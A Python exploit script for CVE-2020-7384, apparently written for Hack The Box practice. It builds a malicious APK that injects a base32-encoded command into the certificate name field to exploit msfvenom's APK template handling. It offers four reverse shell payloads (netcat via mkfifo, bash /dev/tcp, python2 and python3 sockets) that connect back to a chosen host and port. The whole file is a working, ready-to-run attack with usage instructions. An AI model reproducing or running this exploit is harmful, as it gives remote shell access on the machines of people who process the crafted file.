#!/usr/bin/env python3

import subprocess
import os
import sys
from base64 import b32encode
from pwn import *
from time import sleep

print("""\033[1;31;40m
         /$$$$$$       /$$$$$$$$       /$$$$$$$$        /$$$$$$        /$$$$$$$         /$$$$$$ 
		|_  $$_/      |_____ $$/      |_____ $$        /$$__  $$      | $$__  $$       /$$$_  $$
		  | $$             /$$/            /$$/       |__/  \ $$      | $$  \ $$      | $$$$\ $$
		  | $$            /$$/            /$$/           /$$$$$/      | $$$$$$$/      | $$ $$ $$
		  | $$           /$$/            /$$/           |___  $$      | $$__  $$      | $$\ $$$$
		  | $$          /$$/            /$$/           /$$  \ $$      | $$  \ $$      | $$ \ $$$
		 /$$$$$$       /$$/            /$$$$$$$$      |  $$$$$$/      | $$  | $$      |  $$$$$$/
		|______/      |__/            |________/       \______/       |__/  |__/       \______/ 


		Hack the boxes and live the happy life\n \033[1;32;40m""")


def msfvenom(ip, port, code):


    payload = ""

    nc = "mkfifo /tmp/nbnvdoi; nc {} {} 0</tmp/nbnvdoi | /bin/sh >/tmp/nbnvdoi 2>&1; rm /tmp/nbnvdoi".format(ip, port)
    bash = '/bin/bash -c "/bin/bash -i >& /dev/tcp/{}/{} 0>&1"'.format(ip, port)
    python2_variable = ["python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);",
                        's.connect(("', ip, '"', port, "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);",
                        'os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);']
    python2 = "".join(python2_variable)
    python3_variable = ["python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);",
                        's.connect(("', ip, '"', port, "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);",
                        'os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);']
    python3 = "".join(python3_variable)

    if code == "1":
        payload += nc

    elif code == "2":
        payload += bash

    elif code == "3":
        payload += python2
    elif code == "4":
        payload += python3
    else:
        print("\n You have entered the incorrect Application Number, Enter either 1/2/3/4 to create a correct reverse shell\n")
        sys.exit()

    log.progress("Selecting the correct Reverse Shell payload \n")

    payload_b32 = b32encode(payload.encode()).decode()
    dname = f"CN='|echo {payload_b32} | base32 -d | sh #"
    
    log.progress("Deleting the existing directories on the /tmp folder with the name CVE-2020-7384\n")

    subprocess.call("rm -rf /tmp/CVE-2020-7384", shell=True)
    subprocess.call("rm -rf /tmp/signing.keystore 2>/dev/null", shell=True)
    subprocess.call("rm -rf /tmp/empty_file 2> /dev/null", shell=True)
    subprocess.call("rm -rf /tmp/exploit.apk 2> /dev/null", shell=True)
    
    log.progress("Creating a folder on /tmp directory called CVE-2020-7384 to save apk file\n")

    subprocess.call("mkdir -p /tmp/CVE-2020-7384", shell=True)

    directory = "/tmp/CVE-2020-7384/"  # Change the path if required
    apk = os.path.join(directory, "exploit.apk")
    empty_file = os.path.join(directory, "empty_file")
    key_file = os.path.join(directory, "signing.keystore")
    storepass = keypass = "password"
    key_alias = "signing.key"

    open(empty_file, "w").close()
    subprocess.check_call(["zip", "-j", apk, empty_file])
    
    log.progress("Creating a process to create .apk file\n")
    
    subprocess.check_call(["keytool", "-genkey", "-keystore", key_file, "-alias", key_alias, "-storepass", storepass, "-keypass", keypass,"-keyalg", "RSA", "-keysize", "2048", "-dname", dname])
    subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", key_file, "-storepass", storepass,"-keypass", keypass, apk, key_alias])
    
    log.progress("Process Completed!, Saving the file in /tmp/CVE-2020-7384 \n")
    
    sleep(2)
    
    print("\n Success! Your apk file is stored in /tmp/CVE-2020-7384 directory as exploit.apk\n")


if __name__ == '__main__':

    if len(sys.argv[1:]) < 2:
        print('''

    Usage = python3 exploit.py <LHOST> <LPORT> 1/2/3/4
    
    1 = nc reverse shell
    2 = bash reverse shell
    3 = python2 reverse shell
    4 = python3 reverse shell
    
    
    example for nc = python3 exploit.py 10.10.10.10 8888 1
    example for bash = python3 exploit.py 10.10.10.10 8888 2
    example for python2 = python3 exploit.py 10.10.10.10 8888 3
    example for python3 = python3 exploit.py 10.10.10.10 8888 4



        ''')

    else:
        ip = sys.argv[1].strip()
        port = sys.argv[2].strip()
        code = sys.argv[3].strip()

        msfvenom(ip, port, code)
